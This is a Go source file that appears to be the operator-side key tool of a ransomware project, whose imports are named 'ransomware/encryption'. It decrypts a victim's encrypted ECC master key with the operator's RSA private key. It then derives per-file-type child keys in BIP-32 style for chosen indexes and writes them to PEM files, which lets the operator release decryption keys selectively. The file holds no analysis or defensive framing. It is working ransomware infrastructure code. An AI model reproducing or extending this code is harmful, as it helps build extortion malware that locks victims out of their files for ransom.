package main

import (
	"errors"
	"fmt"
	"os"
	"ransomware/encryption"
	"ransomware/encryption/eccLib"
	"ransomware/encryption/rsaLib"
	"ransomware/utils"
	"strconv"
)

var (
	sPrivKey, _ = rsaLib.ReadRSAPrivateKey("privateKey.pem")
)

func decryptClientKey(path string) (*eccLib.ExtendedPrivateKey, error) {

	block, _ := os.ReadFile(path)

	decodedBlock, err := encryption.RSAAESDecrypt(block, sPrivKey)
	if err != nil {
		return nil, err
	}

	masterKey, err := eccLib.DeserializeExtendedPrivateKey(decodedBlock)
	if err != nil {
		return nil, err
	}

	err = eccLib.StoreExtPrivateKey("cMasterKey.pem", masterKey)
	if err != nil {
		return nil, err
	}

	return masterKey, nil
}

func generateClientKeys(masterKey *eccLib.ExtendedPrivateKey, indexes []string) ([]*eccLib.ExtendedPrivateKey, error) {

	var i uint16
	var childsNumber uint16 = utils.FileTypeLenght
	var err error

	var privChildKeys = make([]*eccLib.ExtendedPrivateKey, childsNumber)

	for i = 0; i < childsNumber; i++ {

		iString := strconv.FormatInt(int64(i+1), 10)

		if utils.Contains(indexes, iString) {

			privChildKeys[i], err = recurDerivPrivKey(masterKey, i+1, childsNumber, 3)
			if err != nil {
				fmt.Println("Failed to derive child key for index ", i+1)
			}
		} else {
			privChildKeys[i] = nil
		}

	}

	return privChildKeys, nil
}

// Tries to derive child key for index i. There is a probability lower than 1 in 2^127 that a
// a given index is invalid for child derivation (https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki#private-parent-key--private-child-key). In that case, returns child of index i + dI.
// Recursive tries this method "tries" times
func recurDerivPrivKey(
	parentKey *eccLib.ExtendedPrivateKey,
	i uint16,
	dI uint16,
	tries int,
) (*eccLib.ExtendedPrivateKey, error) {

	if tries > 0 {
		childKey, err := eccLib.PrivChildDeriv(*parentKey, i)
		if err == nil {
			return childKey, nil
		}
	} else {
		return nil, errors.New("Failed to generate child key")
	}

	return recurDerivPrivKey(parentKey, i+dI, dI, tries-1)
}

func main() {

	var keys []*eccLib.ExtendedPrivateKey
	var masterKey *eccLib.ExtendedPrivateKey
	var err error

	args := os.Args

	if len(args) < 3 {
		panic("Missing command line arguments")
	}

	path := args[1]
	indexes := args[2:]

	if masterKey, err = decryptClientKey(path); err != nil {
		fmt.Println(err)
	}

	if keys, err = generateClientKeys(masterKey, indexes); err != nil {
		fmt.Println(err)
	}

	eccLib.StoreExtPrivateKeys("privateKeys.pem", keys)

}
